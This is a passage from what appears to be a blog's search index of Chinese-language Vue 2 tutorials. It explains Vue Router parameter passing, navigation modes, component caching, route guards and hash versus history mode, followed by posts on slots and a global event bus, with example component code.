&#125;&lt;/script&gt;\n\n路由的params参数\n配置路由，声明接收params参数\n&#123;\tpath:&#x27;/home&#x27;,\tcomponent:Home,\tchildren:[\t\t&#123;\t\t\tpath:&#x27;news&#x27;,\t\t\tcomponent:News\t\t&#125;,\t\t&#123;\t\t\tcomponent:Message,\t\t\tchildren:[\t\t\t\t&#123;\t\t\t\t\tname:&#x27;xiangqing&#x27;,\t\t\t\t\tpath:&#x27;detail/:id/:title&#x27;, // 🔴使用占位符声明接收params参数\t\t\t\t\tcomponent:Detail\t\t\t\t&#125;\t\t\t]\t\t&#125;\t]&#125;\n\n传递参数\n\n特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！\n\n&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to=&quot;/home/message/detail/666/你好&quot;&gt;跳转&lt;/router-link&gt;\t\t\t\t&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link \t:to=&quot;&#123;\t\tname:&#x27;xiangqing&#x27;,\t\tparams:&#123;\t\t   id:666,       title:&#x27;你好&#x27;\t\t&#125;\t&#125;&quot;&gt;跳转&lt;/router-link&gt;\n\n接收参数\n$route.params.id$route.params.title\n\n代码示例：\nsrc/router/index.js\nimport VueRouter from &quot;vue-router&quot;;import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;export default new VueRouter(&#123;    routes:[        &#123;            path:&#x27;/about&#x27;,            component:About        &#125;,        &#123;            path:&#x27;/home&#x27;,            component:Home,            children:[                &#123;                    path:&#x27;news&#x27;,                    component:News                &#125;,                &#123;                    path:&#x27;message&#x27;,                    component:Message,                    children:[                        &#123;                            name:&#x27;xiangqing&#x27;,                            path:&#x27;detail/:id/:title&#x27;,\t// 使用占位符声明接收params参数                            component:Detail                        &#125;                    ]                &#125;            ]        &#125;    ]&#125;)\n\nsrc/pages/Message.vue\n&lt;template&gt;    &lt;div&gt;        &lt;ul&gt;            &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;                              &lt;!-- 跳转路由并携带params参数，to的字符串写法 --&gt;                &lt;!-- &lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;                    &#123;&#123;m.title&#125;&#125;                &lt;/router-link&gt;&amp;nbsp;&amp;nbsp; --&gt;                &lt;!-- 跳转路由并携带params参数，to的对象写法 --&gt;                &lt;router-link :to=&quot;&#123;                    name:&#x27;xiangqing&#x27;,                    params:&#123;                        id:m.id,                        title:m.title                    &#125;                &#125;&quot;&gt;                    &#123;&#123;m.title&#125;&#125;                &lt;/router-link&gt;&amp;nbsp;&amp;nbsp;            &lt;/li&gt;        &lt;/ul&gt;        &lt;hr/&gt;        &lt;router-view&gt;&lt;/router-view&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;,        data()&#123;            return&#123;                messageList:[                  &#123;id:&#x27;001&#x27;,title:&#x27;消息001&#x27;&#125;,                  &#123;id:&#x27;002&#x27;,title:&#x27;消息002&#x27;&#125;,                  &#123;id:&#x27;003&#x27;,title:&#x27;消息003&#x27;&#125;                ]            &#125;        &#125;    &#125;&lt;/script&gt;\n\n​        src/pages/Detail.vue\n&lt;template&gt;  &lt;ul&gt;    &lt;li&gt;消息编号：&#123;&#123; $route.params.id &#125;&#125;&lt;/li&gt;    &lt;li&gt;消息标题：&#123;&#123; $route.params.title &#125;&#125;&lt;/li&gt;  &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Detail&#x27;    &#125;&lt;/script&gt;\n\n路由的props参数\nprops作用：让路由组件更方便的收到参数\n&#123;\tname:&#x27;xiangqing&#x27;,\tpath:&#x27;detail/:id&#x27;,\tcomponent:Detail,\t//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件\t// props:&#123;a:900&#125;\t//第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件\t// props:true\t\t//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件\tprops($route)&#123;\t\treturn &#123;\t\t\tid: $route.query.id,\t\t\ttitle: $route.query.title\t\t&#125;\t&#125;&#125;\n\n代码示例：\nsrc/router/index.js\nimport VueRouter from &quot;vue-router&quot;;import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;export default new VueRouter(&#123;  routes:[    &#123;      path: &#x27;/about&#x27;,      component: About    &#125;,    &#123;      path:&#x27;/home&#x27;,      component:Home,      children:[        &#123;          path:&#x27;news&#x27;,          component:News        &#125;,        &#123;          path:&#x27;message&#x27;,          component:Message,          children:[            &#123;              name:&#x27;xiangqing&#x27;,              path:&#x27;detail/:id/:title&#x27;,              component:Detail,              // props的第一种写法，值为对象，              // 该对象中的所有key-value都会以props的形式传给Detail组件              // props:&#123;a:1,b:&#x27;hello&#x27;&#125;              // props的第二种写法，值为布尔值，              // 若布尔值为真，会把该路由组件收到的所有params参数，以props的形式传给Detail组件              // props:true              // props的第三种写法，值为函数              props(params) &#123; // 这里可以使用解构赋值                return &#123;                  id: params.id,                  title: params.title,                &#125;              &#125;            &#125;          ]        &#125;      ]    &#125;  ]&#125;)\n\nsrc/pages/Message.vue\n&lt;template&gt;\t&lt;div&gt;    &lt;ul&gt;      &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;        &lt;router-link :to=&quot;&#123;                name:&#x27;xiangqing&#x27;,                params:&#123;                    id:m.id,                    title:m.title                &#125;         &#125;&quot;&gt;          \t&#123;&#123;m.title&#125;&#125;  \t\t\t&lt;/router-link&gt;&amp;nbsp;&amp;nbsp;  \t\t&lt;/li&gt;  \t&lt;/ul&gt;    &lt;hr/&gt;    &lt;router-view&gt;&lt;/router-view&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;,        data()&#123;            return&#123;                messageList:[                    &#123;id:&#x27;001&#x27;,title:&#x27;消息001&#x27;&#125;,                    &#123;id:&#x27;002&#x27;,title:&#x27;消息002&#x27;&#125;,                    &#123;id:&#x27;003&#x27;,title:&#x27;消息003&#x27;&#125;                ]            &#125;        &#125;    &#125;&lt;/script&gt;\n\n​        src/pages/Detail.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li&gt;消息编号：&#123;&#123; id &#125;&#125;&lt;/li&gt;        &lt;li&gt;消息标题：&#123;&#123; title &#125;&#125;&lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Detail&#x27;,        props:[&#x27;id&#x27;,&#x27;title&#x27;]    &#125;&lt;/script&gt;\n\n路由跳转的replace方法\n作用：控制路由跳转时操作浏览器历史记录的模式（前进后退）\n\n浏览器的历史记录有两种写入方式：push和replace\n\npush是追加历史记录\nreplace是替换当前记录，路由跳转时候默认为push方式\n\n\n开启replace模式\n&lt;router-link :replace=&quot;true&quot; ...&gt;News&lt;/router-link&gt;\n简写&lt;router-link replace ...&gt;News&lt;/router-link&gt;\n\n\n总结：浏览记录本质是一个栈，默认push，点开新页面就会在栈顶追加一个地址，后退，栈顶指针向下移动，改为replace就是不追加，而将栈顶地址替换\nsrc/pages/Home.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;Home组件内容&lt;/h2&gt;    &lt;div&gt;      &lt;ul class=&quot;nav nav-tabs&quot;&gt;        &lt;li&gt;          &lt;router-link replace class=&quot;list-group-item&quot; active-class=&quot;active&quot;                        to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;    \t\t&lt;/li&gt;        &lt;li&gt;          &lt;router-link replace class=&quot;list-group-item&quot; active-class=&quot;active&quot;                        to=&quot;/home/message&quot;&gt;Message&lt;/router-link&gt;    \t\t&lt;/li&gt;    &lt;/ul&gt;    &lt;router-view&gt;&lt;/router-view&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name:&#x27;Home&#x27;  &#125;&lt;/script&gt;\n\n编程式路由导航（不用&lt;router-link&gt;）\n作用：不借助&lt;router-link&gt;实现路由跳转，让路由跳转更加灵活\nthis.$router.push(&#123;&#125;) 内传的对象与&lt;router-link&gt;中的to相同\nthis.$router.replace(&#123;&#125;)\nthis.$router.forward() 前进\nthis.$router.back() 后退\nthis.$router.go(n) 可前进也可后退，n为正数前进n，为负数后退\nthis.$router.push(&#123;\tname:&#x27;xiangqing&#x27;,  params:&#123;    id:xxx,    title:xxx  &#125;&#125;)this.$router.replace(&#123;\tname:&#x27;xiangqing&#x27;,  params:&#123;    id:xxx,    title:xxx  &#125;&#125;)\n\n\n\n\nsrc/components/Banner.vue\n&lt;template&gt;\t&lt;div class=&quot;col-xs-offset-2 col-xs-8&quot;&gt;\t\t&lt;div class=&quot;page-header&quot;&gt;\t\t\t&lt;h2&gt;Vue Router Demo&lt;/h2&gt;\t\t\t&lt;button @click=&quot;back&quot;&gt;后退&lt;/button&gt;\t\t\t&lt;button @click=&quot;forward&quot;&gt;前进&lt;/button&gt;\t\t\t&lt;button @click=&quot;test&quot;&gt;测试一下go&lt;/button&gt;\t\t&lt;/div&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\texport default &#123;\t\tname:&#x27;Banner&#x27;,\t\tmethods:&#123;\t\t\tback()&#123;\t\t\t\tthis.$router.back()\t\t\t&#125;,\t\t\tforward()&#123;\t\t\t\tthis.$router.forward()\t\t\t&#125;,\t\t\ttest()&#123;\t\t\t\tthis.$router.go(3)\t\t\t&#125;\t\t&#125;,\t&#125;&lt;/script&gt;\n\nsrc/pages/Message.vue\n&lt;template&gt;    &lt;div&gt;        &lt;ul&gt;            &lt;li v-for=&quot;m in messageList&quot; :key=&quot;m.id&quot;&gt;                &lt;router-link :to=&quot;&#123;                    name:&#x27;xiangqing&#x27;,                    params:&#123;                        id:m.id,                        title:m.title                    &#125;                &#125;&quot;&gt;                    &#123;&#123;m.title&#125;&#125;                &lt;/router-link&gt;                &lt;button @click=&quot;showPush(m)&quot;&gt;push查看&lt;/button&gt;                &lt;button @click=&quot;showReplace(m)&quot;&gt;replace查看&lt;/button&gt;            &lt;/li&gt;        &lt;/ul&gt;        &lt;hr/&gt;        &lt;router-view&gt;&lt;/router-view&gt;    &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;,        data()&#123;            return&#123;                messageList:[                    &#123;id:&#x27;001&#x27;,title:&#x27;消息001&#x27;&#125;,                    &#123;id:&#x27;002&#x27;,title:&#x27;消息002&#x27;&#125;,                    &#123;id:&#x27;003&#x27;,title:&#x27;消息003&#x27;&#125;                ]            &#125;        &#125;,        methods:&#123;            showPush(m)&#123;                this.$router.push(&#123;                    name:&#x27;xiangqing&#x27;,                    query:&#123;                        id:m.id,                        title:m.title                    &#125;                &#125;)            &#125;,            showReplace(m)&#123;                this.$router.replace(&#123;                    name:&#x27;xiangqing&#x27;,                    query:&#123;                        id:m.id,                        title:m.title                    &#125;                &#125;)            &#125;        &#125;    &#125;&lt;/script&gt;\n\n缓存路由组件\n作用：让不展示的路由组件保持挂载，不被销毁\n&lt;keep-alive include=&quot;News&quot;&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n&lt;keep-alive :include=&quot;[&#39;News&#39;, &#39;Message&#39;]&quot;&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n// 缓存一个路由组件&lt;keep-alive include=&quot;News&quot;&gt; // include中写想要缓存的组件名（不是陆游名），不写表示全部缓存    &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;// 缓存多个路由组件&lt;keep-alive :include=&quot;[&#x27;News&#x27;,&#x27;Message&#x27;]&quot;&gt;     &lt;router-view&gt;&lt;/router-view&gt;&lt;/keep-alive&gt;\n\n\n\n\n代码示例：\nsrc/pages/News.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;    &#125;&lt;/script&gt;\n\nsrc/pages/Home.vue\n&lt;template&gt;  &lt;div&gt;    &lt;h2&gt;Home组件内容&lt;/h2&gt;    &lt;div&gt;      &lt;ul class=&quot;nav nav-tabs&quot;&gt;        &lt;li&gt;&lt;router-link replace class=&quot;list-group-item&quot; active-class=&quot;active&quot;                        to=&quot;/home/news&quot;&gt;News&lt;/router-link&gt;&lt;/li&gt;        &lt;li&gt;&lt;router-link replace class=&quot;list-group-item&quot; active-class=&quot;active&quot;                        to=&quot;/home/message&quot;&gt;Message&lt;/router-link&gt;&lt;/li&gt;    \t&lt;/ul&gt;      &lt;keep-alive include=&quot;News&quot;&gt;        &lt;router-view&gt;&lt;/router-view&gt;    \t&lt;/keep-alive&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;Home&#x27;    &#125;&lt;/script&gt;\n\n路由独有的生命周期钩子（activated deactivated）activated和deactivated是路由组件所独有的两个钩子，用于捕获路由组件的激活状态\n\n具体使用\nactivated路由组件被激活时触发\ndeactivated路由组件失活时触发\n\n\n\n\nsrc/pages/News.vue\n&lt;template&gt;    &lt;ul&gt;        &lt;li :style=&quot;&#123;opacity&#125;&quot;&gt;欢迎学习vue&lt;/li&gt;        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;    &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;News&#x27;,        data()&#123;            return&#123;                opacity:1            &#125;        &#125;,        activated()&#123;            console.log(&#x27;News组件被激活了&#x27;)            this.timer = setInterval(() =&gt; &#123;                this.opacity -= 0.01                if(this.opacity &lt;= 0) this.opacity = 1            &#125;,16)        &#125;,        deactivated()&#123;            console.log(&#x27;News组件失活了&#x27;)            clearInterval(this.timer)        &#125;    &#125;&lt;/script&gt;\n\n路由守卫\n作用：对路由进行权限控制\n\n分类：全局守卫、独享守卫、组件内守卫\n\n全局守卫\n\n\n​    meta路由源信息\n// 全局前置守卫：初始化时、每次路由切换前执行router.beforeEach((to,from,next) =&gt; &#123;\tconsole.log(&#x27;beforeEach&#x27;,to,from)\tif(to.meta.isAuth)&#123; // 判断当前路由是否需要进行权限控制\t\tif(localStorage.getItem(&#x27;school&#x27;) === &#x27;atguigu&#x27;)&#123; // 权限控制的具体规则\t\t\tnext()\t// 放行\t\t&#125;else&#123;\t\t\talert(&#x27;暂无权限查看&#x27;)\t\t&#125;\t&#125;else&#123;\t\tnext()\t// 放行\t&#125;&#125;)// 全局后置守卫：初始化时、每次路由切换后执行router.afterEach((to,from) =&gt; &#123;\tconsole.log(&#x27;afterEach&#x27;,to,from)\tif(to.meta.title)&#123; \t\tdocument.title = to.meta.title //修改网页的title\t&#125;else&#123;\t\tdocument.title = &#x27;vue_test&#x27;\t&#125;&#125;)\n\n\n独享守卫\n只有前置没有后置，写在路由配置项中\n\n\nbeforeEnter(to,from,next)&#123;\tconsole.log(&#x27;beforeEnter&#x27;,to,from)    if(localStorage.getItem(&#x27;school&#x27;) === &#x27;atguigu&#x27;)&#123;        next()    &#125;else&#123;        alert(&#x27;暂无权限查看&#x27;)    &#125;&#125;\n\n\n组件内守卫\n不能说前置、后置，写在组件配置项中\n\n\n//进入守卫：通过路由规则，进入该组件时被调用beforeRouteEnter (to, from, next) &#123;... next()&#125;,//离开守卫：通过路由规则，离开该组件时被调用beforeRouteLeave (to, from, next) &#123;... next()&#125;,\n\n全局路由守卫src/router/index.js\n//该文件专门用于创建整个应用的路由器import VueRouter from &quot;vue-router&quot;;//引入组件import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;//创建一个路由器const router = new VueRouter(&#123;    routes:[        &#123;            name:&#x27;guanyv&#x27;,            path:&#x27;/about&#x27;,            component:About,            meta:&#123;title:&#x27;关于&#x27;&#125;        &#125;,        &#123;            name:&#x27;zhuye&#x27;,            path:&#x27;/home&#x27;,            component:Home,            meta:&#123;title:&#x27;主页&#x27;&#125;,            children:[                &#123;                    name:&#x27;xinwen&#x27;,                    path:&#x27;news&#x27;,                    component:News,                    meta:&#123;isAuth:true,title:&#x27;新闻&#x27;&#125;                &#125;,                &#123;                    name:&#x27;xiaoxi&#x27;,                    path:&#x27;message&#x27;,                    component:Message,                    meta:&#123;isAuth:true,title:&#x27;消息&#x27;&#125;,                    children:[                        &#123;                            name:&#x27;xiangqing&#x27;,                            path:&#x27;detail&#x27;,                            component:Detail,                            meta:&#123;isAuth:true,title:&#x27;详情&#x27;&#125;,                            props($route)&#123;                                return &#123;                                    id:$route.query.id,                                    title:$route.query.title,                                &#125;\t\t\t\t\t\t\t\t\t\t\t\t\t\t&#125;                        &#125;                    ]                &#125;            ]        &#125;    ]&#125;)// 🔴全局前置路由守卫————初始化的时候、每次路由切换之前被调用router.beforeEach((to,from,next) =&gt; &#123;    console.log(&#x27;前置路由守卫&#x27;,to,from)    if(to.meta.isAuth)&#123;        if(localStorage.getItem(&#x27;school&#x27;)===&#x27;atguigu&#x27;)&#123;            next()        &#125;else&#123;            alert(&#x27;学校名不对，无权限查看！&#x27;)        &#125;    &#125;else&#123;        next()    &#125;&#125;)// 🔴全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用router.afterEach((to,from)=&gt;&#123;\tconsole.log(&#x27;后置路由守卫&#x27;,to,from)\tdocument.title = to.meta.title || &#x27;硅谷系统&#x27;&#125;)// 导出路由器export default router\n\n独享路由守卫src/router/index.js\n//该文件专门用于创建整个应用的路由器import VueRouter from &quot;vue-router&quot;;//引入组件import Home from &#x27;../pages/Home&#x27;import About from &#x27;../pages/About&#x27;import News from &#x27;../pages/News&#x27;import Message from &#x27;../pages/Message&#x27;import Detail from &#x27;../pages/Detail&#x27;//创建一个路由器const router = new VueRouter(&#123;    routes:[        &#123;            name:&#x27;guanyv&#x27;,            path:&#x27;/about&#x27;,            component:About,            meta:&#123;title:&#x27;关于&#x27;&#125;        &#125;,        &#123;            name:&#x27;zhuye&#x27;,            path:&#x27;/home&#x27;,            component:Home,            meta:&#123;title:&#x27;主页&#x27;&#125;,            children:[                &#123;                    name:&#x27;xinwen&#x27;,                    path:&#x27;news&#x27;,                    component:News,                    meta:&#123;title:&#x27;新闻&#x27;&#125;,                    // 🔴独享守卫，特定路由切换之后被调用                    beforeEnter(to,from,next)&#123;                        console.log(&#x27;独享路由守卫&#x27;,to,from)                        if(localStorage.getItem(&#x27;school&#x27;) === &#x27;atguigu&#x27;)&#123;                            next()                        &#125;else&#123;                            alert(&#x27;暂无权限查看&#x27;)                        &#125;                    &#125;                &#125;,                &#123;                    name:&#x27;xiaoxi&#x27;,                    path:&#x27;message&#x27;,                    component:Message,                    meta:&#123;title:&#x27;消息&#x27;&#125;,                    children:[                        &#123;                            name:&#x27;xiangqing&#x27;,                            path:&#x27;detail&#x27;,                            component:Detail,                            meta:&#123;title:&#x27;详情&#x27;&#125;,                            props($route)&#123;                                return &#123;                                    id:$route.query.id,                                    title:$route.query.title,                                &#125;                            &#125;                        &#125;                    ]                &#125;            ]        &#125;    ]&#125;)//全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用router.afterEach((to,from)=&gt;&#123;\tconsole.log(&#x27;后置路由守卫&#x27;,to,from)\tdocument.title = to.meta.title || &#x27;硅谷系统&#x27;&#125;)//导出路由器export default router\n\n组件内路由守卫src/pages/About.vue\n&lt;template&gt;    &lt;h2&gt;我是About组件的内容&lt;/h2&gt;&lt;/template&gt;&lt;script&gt;    export default &#123;        name:&#x27;About&#x27;,        // 通过路由规则，离开该组件时被调用        beforeRouteEnter (to, from, next) &#123;            console.log(&#x27;About--beforeRouteEnter&#x27;,to,from)            if(localStorage.getItem(&#x27;school&#x27;)===&#x27;atguigu&#x27;)&#123;                next()            &#125;else&#123;                alert(&#x27;学校名不对，无权限查看！&#x27;)            &#125;        &#125;,        // 通过路由规则，离开该组件时被调用        beforeRouteLeave (to, from, next) &#123;            console.log(&#x27;About--beforeRouteLeave&#x27;,to,from)            next()        &#125;    &#125;&lt;/script&gt;\n\n路由器的两种工作模式\n对于一个url来说，什么是hash值？\n#及其后面的内容就是hash值\n\nhash值不会包含在HTTP请求中，即：hash值不会带给服务器\n\nhash模式\n\n地址中永远带着#号，不美观\n若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法\n兼容性较好\nhash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对后端完全没有影响，因此改变 hash 不会重新加载页面。\n\n\n路由的哈希模式其实是利用了window.onhashchange事件，也就是说你的url中的哈希值（#后面的值）如果有变化，就会自动调用hashchange的监听事件，在hashchange的监听事件内可以得到改变后的url，这样能够找到对应页面进行加载\n原理：\nwindow.addEventListener(&#x27;hashchange&#x27;, () =&gt; &#123;   // 把改变后的url地址栏的url赋值给data的响应式数据current，调用router-view去加载对应的页面   this.data.current = window.location.hash.substr(1)&#125;)\n\n\nhistory模式\n\n地址干净，美观\n兼容性和hash模式相比略差\n应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题\n\n\nHTML5 History Interface 中新增的两个神器 pushState() 和 replaceState() 方法（需要特定浏览器支持），用来完成 URL 跳转而无须重新加载页面，不过这种模式还需要后台配置支持。因为我们的应用是个单页客户端应用，如果后台没有正确的配置，就需要前端自己配置404页面。\npushState() 和 replaceState() 这两个神器的作用就是可以将url替换并且不刷新页面，好比挂羊头卖狗肉，http并没有去请求服务器该路径下的资源，一旦刷新就会暴露这个实际不存在的“羊头”，显示404（因为浏览器一旦刷新，就是去真正请求服务器资源）\n\n\n\nconst router =  new VueRouter(&#123;\tmode:&#x27;history&#x27;,\troutes:[...]&#125;)export default router\n\n\npushState方法、replaceState方法，只能导致history对象发生变化，从而改变当前地址栏的 URL，但浏览器不会向后端发送请求，也不会触发popstate事件的执行\npopstate事件的执行是在点击浏览器的前进后退按钮的时候，才会被触发\nwindow.addEventListener(&#x27;popstate&#x27;, () =&gt; &#123;  this.data.current = window.location.pathname&#125;)\n\n如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成URL 跳转而无须重新加载页面。 Vue-router 另外，根据 Mozilla Develop Network 的介绍，调用 history.pushState() 相比于直接修改 hash，存在以下优势:\npushState() 设置的新 URL 可以是与当前 URL 同源的任意 URL；而 hash 只可修改 # 后面的部分，因此只能设置与当前 URL 同文档的 URLpushState() 设置的新 URL 可以与当前 URL 一模一样，这样也会把记录添加到栈中；而 hash 设置的新值必须与原来不一样才会触发动作将记录添加到栈中pushState() 通过 stateObject 参数可以添加任意类型的数据到记录中；而 hash 只可添加短字符串pushState() 可额外设置 title 属性供后续使用\n\n总结传统的路由指的是：当用户访问一个url时，对应的服务器会接收这个请求，然后解析url中的路径，从而执行对应的处理逻辑。这样就完成了一次路由分发\n而前端路由是不涉及服务器的，是前端利用hash或者HTML5的history API来实现的，一般用于不同内容的展示和切换\n","categories":["Vue"],"tags":["Vue Router","路由"]},{"title":"Vue（二十六）：slot插槽","url":"/2022/04/12/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%E5%85%AD%EF%BC%89%EF%BC%9Aslot%E6%8F%92%E6%A7%BD/","content":"slot插槽&lt;slot&gt;插槽：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 父组件 &#x3D;&#x3D;&#x3D;&gt; 子组件\n\n分类：默认插槽、具名插槽、作用域插槽\n\n使用方式\n\n默认插槽\n父组件中：        &lt;Category&gt;           &lt;div&gt;html结构1&lt;/div&gt;        &lt;/Category&gt;子组件Category中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\n\n具名插槽\n父组件指明放入子组件的哪个插槽，如slot=&quot;footer&quot;，如果是template可以写成v-slot:footer\n父组件中：        &lt;Category&gt;            &lt;template slot=&quot;center&quot;&gt;              &lt;div&gt;html结构1&lt;/div&gt;            &lt;/template&gt;            &lt;template v-slot:footer&gt;               &lt;div&gt;html结构2&lt;/div&gt;            &lt;/template&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;               &lt;!-- 定义插槽 --&gt;               &lt;slot name=&quot;center&quot;&gt;插槽默认内容...&lt;/slot&gt;               &lt;slot name=&quot;footer&quot;&gt;插槽默认内容...&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\n\n作用域插槽\nscope用于父组件往子组件插槽放的html结构接收子组件的数据\n理解：数据在子组件的自身，但根据数据生成的结构需要组件的使用者来决定（games数据在Category组件中，但使用数据所遍历出来的结构由App（父）组件决定）\n父组件中：        &lt;Category&gt;            &lt;template scope=&quot;scopeData&quot;&gt;                &lt;!-- 生成的是ul列表 --&gt;                &lt;ul&gt;                  &lt;li v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/li&gt;                &lt;/ul&gt;            &lt;/template&gt;        &lt;/Category&gt;        &lt;Category&gt;            &lt;template slot-scope=&quot;scopeData&quot;&gt;                &lt;!-- 生成的是h4标题 --&gt;                &lt;h4 v-for=&quot;g in scopeData.games&quot; :key=&quot;g&quot;&gt;&#123;&#123;g&#125;&#125;&lt;/h4&gt;            &lt;/template&gt;        &lt;/Category&gt;子组件中：        &lt;template&gt;            &lt;div&gt;                &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;            &lt;/div&gt;        &lt;/template&gt;\t\t        &lt;script&gt;            export default &#123;                name:&#x27;Category&#x27;,                props:[&#x27;title&#x27;],                //数据在子组件自身                data() &#123;                    return &#123;                        games:[&#x27;红色警戒&#x27;,&#x27;穿越火线&#x27;,&#x27;劲舞团&#x27;,&#x27;超级玛丽&#x27;]                    &#125;                &#125;,            &#125;        &lt;/script&gt;\n\n\n\n","categories":["Vue"],"tags":["插槽"]},{"title":"Vue（二十）：Vue脚手架之全局事件总线","url":"/2022/04/11/Vue%EF%BC%88%E4%BA%8C%E5%8D%81%EF%BC%89%EF%BC%9AVue%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B9%8B%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/","content":"全局事件总线（GlobalEvenBus）一种可以在任意组件间通信的方式，本质上就是一个对象，它必须满足以下条件：\n\n所有的组件对象都必须能看见他\n这个对象必须能够使用$on $emit $off方法去绑定、触发和解绑事件\n\n\n利用一个重要的内置关系：VueComponent.prototype.proto &#x3D;&#x3D;&#x3D; Vue.prototype，定义全局事件总线，使得所有组件都能看得见它\n\n使用步骤\n定义全局事件总线\nnew Vue(&#123;   \t...   \tbeforeCreate() &#123;   \t\tVue.prototype.$bus = this // 安装全局事件总线，$bus 就是当前应用的 vm   \t&#125;,    ...&#125;)\n\n使用事件总线：A与B通信\n\n接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身\nexport default &#123;    methods()&#123;        demo(data)&#123;...&#125;    &#125;    ...    mounted() &#123;        this.$bus.$on(&#x27;xxx&#x27;,this.demo)    &#125;&#125;\n\n提供数据：B提供数据，在B中\nthis.$bus.$emit(&#39;xxx&#39;,data)\n\n\n\n最好在beforeDestroy钩子中，用$off()去解绑当前组件所用到的事件\n\n\n代码示例\nsrc/main.js\nimport Vue from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;Vue.config.productionTip = falsenew Vue(&#123;  el:&#x27;#app&#x27;,  render: h =&gt; h(App),  beforeCreate() &#123;    Vue.prototype.$bus = this // 安装全局事件总线  &#125;&#125;)\n\nsrc/App.vue\n&lt;template&gt;\t&lt;div class=&quot;app&quot;&gt;\t\t&lt;School/&gt;\t\t&lt;Student/&gt;\t&lt;/div&gt;&lt;/template&gt;&lt;script&gt;\timport Student from &#x27;./components/Student&#x27;\timport School from &#x27;./components/School&#x27;\texport default &#123;\t\tname:&#x27;App&#x27;,\t\tcomponents:&#123; School, Student &#125;\t&#125;&lt;/script&gt;&lt;style scoped&gt;.app&#123;background-color: gray;padding: 5px;&#125;&lt;/style&gt;\n\nsrc/components/School.vue\n&lt;template&gt;  &lt;div class=&quot;school&quot;&gt;    &lt;h2&gt;学校名称：&#123;&#123; name &#125;&#125;&lt;/h2&gt;    &lt;h2&gt;学校地址：&#123;&#123; address &#125;&#125;&lt;/h2&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;  export default &#123;    name: &quot;School&quot;,    data() &#123;      return &#123;        name: &quot;尚硅谷&quot;,        address: &quot;北京&quot;,      &#125;;    &#125;,    mounted() &#123;  //🔴      // console.log(&#x27;School&#x27;,this)      this.$bus.$on(&quot;hello&quot;, (data) =&gt; &#123;        console.log(&quot;我是School组件，收到了数据&quot;, data);      &#125;);    &#125;,    beforeDestroy() &#123;  //🔴      this.$bus.$off(&quot;hello&quot;);    &#125;,  